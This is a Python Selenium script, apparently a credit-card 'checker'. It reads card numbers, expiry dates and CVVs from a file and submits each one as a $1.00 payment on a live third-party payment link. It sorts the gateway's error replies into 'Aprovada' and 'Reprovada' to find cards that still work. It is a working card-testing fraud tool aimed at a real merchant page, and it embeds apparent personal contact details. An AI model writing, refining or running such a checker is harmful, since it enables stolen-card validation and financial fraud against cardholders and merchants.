import os
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

def read_cards_from_file(file_path="C:\\Users\\arado\\cards.txt"):
    cards = []
    try:
        print("Caminho absoluto do arquivo:", os.path.abspath(file_path))
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    card_number, expiry_month, expiry_year, cvv = line.split('|')
                    cards.append((card_number, expiry_month, expiry_year, cvv))
        return cards
    except FileNotFoundError:
        print(f"Erro: Arquivo {file_path} não encontrado.")
        exit(1)
    except ValueError:
        print("Erro: Formato inválido no arquivo TXT. Use: número|mês|ano|cvv")
        exit(1)


def get_bin_info(card_number, bin_file="C:\\Users\\arado\\bins.csv"):
    try:
        with open(bin_file, "r", encoding="utf-8") as file:
            lines = file.readlines()
            for line in lines:
                if card_number[:6] in line:
                    parts = line.strip().split(";")
                    if len(parts) >= 6:
                        return f"{parts[1]} {parts[2]} {parts[3]} {parts[4]} {parts[5]}"
    except FileNotFoundError:
        print(f"Arquivo {bin_file} não encontrado.")
    return "BIN não encontrada."


def test_card(card_number, expiry_month, expiry_year, cvv):
    bin_info = get_bin_info(card_number)
    (f"[ℹ️] BIN Info: {bin_info}")

    chrome_options = Options()
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    url = "https://heartland.hyfin.app/5JH8XPHJXUJR/paymentLink"
    driver.get(url)

    wait = WebDriverWait(driver, 20)

    try:
        wait.until(EC.visibility_of_element_located((By.ID, "amount"))).send_keys("1.00")
        wait.until(EC.visibility_of_element_located((By.ID, "firstName"))).send_keys("Rafael")
        wait.until(EC.visibility_of_element_located((By.ID, "lastName"))).send_keys("Tibolla")
        wait.until(EC.visibility_of_element_located((By.ID, "email"))).send_keys("raphaeltibolla9@gmail.com")
        wait.until(EC.visibility_of_element_located((By.ID, "mobilePhone"))).send_keys("5567891348")
        wait.until(EC.visibility_of_element_located((By.NAME, "0.value"))).send_keys("4567")
        wait.until(EC.visibility_of_element_located((By.ID, "description-textarea"))).send_keys("Payment")
        wait.until(EC.visibility_of_element_located((By.NAME, "nameOnCard"))).send_keys("Rafael Tibolla")
        wait.until(EC.visibility_of_element_located((By.ID, "zipInput"))).send_keys("21502")

        driver.switch_to.frame(driver.find_element(By.NAME, "card-number"))
        wait.until(EC.element_to_be_clickable((By.TAG_NAME, "input"))).send_keys(card_number)
        driver.switch_to.default_content()

        driver.switch_to.frame(driver.find_element(By.NAME, "card-expiration"))
        wait.until(EC.element_to_be_clickable((By.TAG_NAME, "input"))).send_keys(f"{expiry_month}/{expiry_year}")
        driver.switch_to.default_content()

        driver.switch_to.frame(driver.find_element(By.NAME, "card-cvv"))
        wait.until(EC.element_to_be_clickable((By.TAG_NAME, "input"))).send_keys(cvv)
        driver.switch_to.default_content()

        submit_button_xpath = "hyfin-yaylb9"
        submit_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, submit_button_xpath)))
        submit_button.click()

        error_message_xpath = "hyfin-ynv4vk"
        try:
            error_message = wait.until(EC.presence_of_element_located((By.CLASS_NAME, error_message_xpath)))
            if "Invalid card, please try again" in error_message.text:
                print(f"Reprovada ➔ {card_number}|{expiry_month}|{expiry_year}|{cvv}|{bin_info} ➔ Invalid card, please try again ➔ @DIDIAC68")
            elif "Invalid CVV, please try again" in error_message.text:
                print(f"Aprovada ➔ {card_number}|{expiry_month}|{expiry_year}|{cvv}|{bin_info} ➔ Invalid CVV, please try again ➔ @DIDIAC68")
            elif "Card is expired" in error_message.text:
                print(f"Aprovada ➔ {card_number}|{expiry_month}|{expiry_year}|{cvv}|{bin_info} ➔ Card is expired ➔ @DIDIAC68")
            elif "SEC VIOLATION" in error_message.text:
                print(f"Aprovada ➔ {card_number}|{expiry_month}|{expiry_year}|{cvv}|{bin_info} ➔ SEC VIOLATION (63) ➔ @DIDIAC68")
            else:
                print(f"Reprovada ➔ {card_number}|{expiry_month}|{expiry_year}|{cvv}|{bin_info}| ➔ {error_message.text} ➔ @DIDIAC68")
        except:
            print("Nenhum erro encontrado.")
        time.sleep(3)
    except Exception as e:
        print(f"Erro com cartão {card_number}|{expiry_month}|{expiry_year}|{cvv}|{bin_info}|{e}")
    finally:
        driver.quit()


if __name__ == "__main__":
    cards = read_cards_from_file("C:\\Users\\arado\\cards.txt")
    for card in cards:
        test_card(*card)